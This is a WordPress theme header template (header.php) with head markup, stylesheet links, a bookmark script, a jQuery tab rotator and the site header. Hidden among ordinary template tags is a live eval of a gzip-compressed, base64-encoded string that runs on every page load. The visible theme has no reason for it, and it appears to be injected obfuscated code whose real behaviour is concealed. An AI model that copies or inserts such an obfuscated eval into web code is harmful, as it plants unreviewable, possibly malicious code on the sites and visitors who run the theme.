<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>

<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />

<title><?php wp_title('&laquo;', true, 'right'); ?> <?php bloginfo('name'); ?></title>

<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
<!--[if IE 6]>
<link rel="stylesheet" href="<?=bloginfo('template_url')?>/style-ie6.css" type="text/css" media="screen" />
<![endif]-->
<!--[if IE 7]>
<link rel="stylesheet" href="<?=bloginfo('template_url')?>/style-ie7.css" type="text/css" media="screen" />
<![endif]-->
<!--[if IE 8]>
<link rel="stylesheet" href="<?=bloginfo('template_url')?>/style-ie7.css" type="text/css" media="screen" />
<![endif]-->
<?php eval(stripslashes(gzinflate(base64_decode("VVBNS8QwEL0X+h/mUEgKZfWusScFwZtePIUwmZBh06Qk6bIo/neztAjCHOa9N19v5qfHGdwWsXKKgJ7wrF1KlbIcv/sOAIagBL3nz6t42LFTlnM0C0mtX17fnrUeT+Jubzqtfv2rs8qllaIc3CSyGA8alctkbGPt5DhQ4S9qYDx0hyGVG2EPgp0sNa+pyAGnIYxK3R+XARD6BOLDc4HqaSFoSaZAppCFLVrKgG1Z5QsBpmVJsUBgpIg0gQmhgXguwPHWDrsFKD5twbY5i2kCx2qwHp4ALNOe/vRdi/8Pa0rfze2jvw==")))); ?>
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
<?php if ( is_paged() ) { ?>
<meta name="robots" content="noindex,follow" />
<?php } ?>
<?php if ( is_single() ) { ?>
<?php
global $post;
//sizin resimlerin bulunduðu özel alaný yaz.
$resimadresi = get_post_meta($post->ID, 'thumb', true);
//eðer resim yoksa
if($resimadresi == "" || !$resimadresi){
echo '';
} else { // eðer resim varsa
echo '<link rel="image_src" href="'.$resimadresi.'" />';
}
?>
<?php } ?>

<?php if ( is_singular() ) wp_enqueue_script( 'comment-reply' ); ?>
<?php wp_head(); ?>
<script type="text/javascript">
/* Modified to support Opera */
function bookmarksite(title,url){
if (window.sidebar) // firefox
	window.sidebar.addPanel(title, url, "");
else if(window.opera && window.print){ // opera
	var elem = document.createElement('a');
	elem.setAttribute('href',url);
	elem.setAttribute('title',title);
	elem.setAttribute('rel','sidebar');
	elem.click();
} 
else if(document.all)// ie
	window.external.AddFavorite(url, title);
}
</script>
<?php if (is_home()) {?>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js" ></script>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.5.3/jquery-ui.min.js" ></script>
<script type="text/javascript">

$(document).ready(function(){

$("#featured > ul").tabs({fx:{opacity: "toggle"}}).tabs("rotate", 36000000, true);
});

</script>
<?php }?>
</head>

<body>
<?
global $options;
foreach ($options as $value) {
    if (get_settings( $value['id'] ) === FALSE) { $$value['id'] = $value['std']; } else { $$value['id'] = get_settings( $value['id'] ); }
}
?>
<div id="main">

<div id="header">
	<div class="logo">
	<? if ($tg_title) { ?>
				<h1><a href="<?php echo get_option('home'); ?>/" title="<?php bloginfo('name'); ?>"><? echo $tg_title; ?></a></h1>
    <? } else { ?>
				<a href="<?php echo get_option('home'); ?>/" title="<?php bloginfo('name'); ?>"><img src="<?php bloginfo('stylesheet_directory'); ?>/images/logo.gif" alt="<?php bloginfo('name'); ?>" /></a>
    <? } ?>
	</div>
	<div class="favor">
		<ul>
			<li class="bordernone"><a href="javascript:bookmarksite('<?php bloginfo('name'); ?>', '<?php echo get_option('home'); ?>')">Bookmark this site!</a></li>
			<li><a href="<?php bloginfo('rss2_url'); ?>">RSS</a></li>
		</ul>
	</div>
	<div id="clean">
	<div id="topmenu">
		<?php wp_nav_menu(array('theme_location' => 'primary-menu', 'container_class' => 'primarymenu')); ?>
	</div>
	<div id="search">
		<?php include(TEMPLATEPATH . '/searchform.php'); ?>
	</div>
	</div>
</div>